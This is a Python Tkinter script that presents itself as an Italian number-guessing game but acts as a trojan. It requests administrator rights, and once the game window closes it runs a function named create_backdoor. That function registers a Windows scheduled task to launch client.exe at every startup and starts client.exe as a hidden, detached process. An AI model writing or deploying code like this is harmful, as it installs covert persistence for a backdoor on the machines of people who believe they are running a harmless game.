from tkinter import *

def create_backdoor():
    import os
    from subprocess import Popen
    import subprocess

    #target = 'client.py'

    #py = [sys.executable]
    DETACHED_PROCESS = 0x00000008
    CREATE_NO_WINDOW = 0x08000000

    path = os.getcwd()

    print(path)
    
    subprocess.Popen(f"SCHTASKS /CREATE /SC ONSTART /TN \"_\" /TR \"{path}\client.exe\"", shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    process = Popen(f"{path}\client.exe".split(), close_fds=True, creationflags=DETACHED_PROCESS + CREATE_NO_WINDOW)
    #process = Popen(py + [target], close_fds=True, creationflags=DETACHED_PROCESS)

    print(str(process.pid))
    pass

"""GIOCO"""

def guess():
    input = text.get("1.0", 'end-1c')
    try:
        int(input)
        label.set(f"Il tuo numero e' {input}")
    except:
        label.set(f"Non barare")
    pass

window = Tk()
window.geometry("400x400")
window.title("NUMBER GUESSER")
window.resizable(False, False)

label = StringVar()
label.set("")

button = Button(window, text="Guess", command=guess, height=2, width=10)
button.place(relx=0.5, rely=0.7, anchor=CENTER)

text = Text(window, height=2, width=20)
text.place(relx=0.5, rely=0.4, anchor=CENTER)

Label(window, text="Inserisci un numero ed io lo indovinero'").place(relx=0.5, rely=0.1, anchor=CENTER)

Label(window, textvariable=label).place(relx=0.5, rely=0.9, anchor=CENTER)

import pyuac

if pyuac.isUserAdmin():
    window.mainloop()
    create_backdoor()
else:
    pyuac.runAsAdmin()
    # import win32api
    # win32api.MessageBox(0, 'You need admin privileges', 'ERROR')